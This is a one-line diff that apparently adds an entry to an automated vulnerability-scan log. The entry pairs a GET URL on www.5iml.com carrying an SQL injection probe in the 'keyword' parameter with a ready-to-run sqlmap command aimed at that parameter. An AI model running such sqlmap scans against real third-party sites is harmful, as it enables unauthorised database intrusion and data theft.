@@ -1,0 +1,1 @@
+http://www.5iml.com:80/?author=1&keyword=1'"&type=log (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\011_SQL_Injection_keyword_3884149438133831095.txt --batch --smart --random-agent --output-dir sqlmap_output\011_3884149438133831095 -p keyword
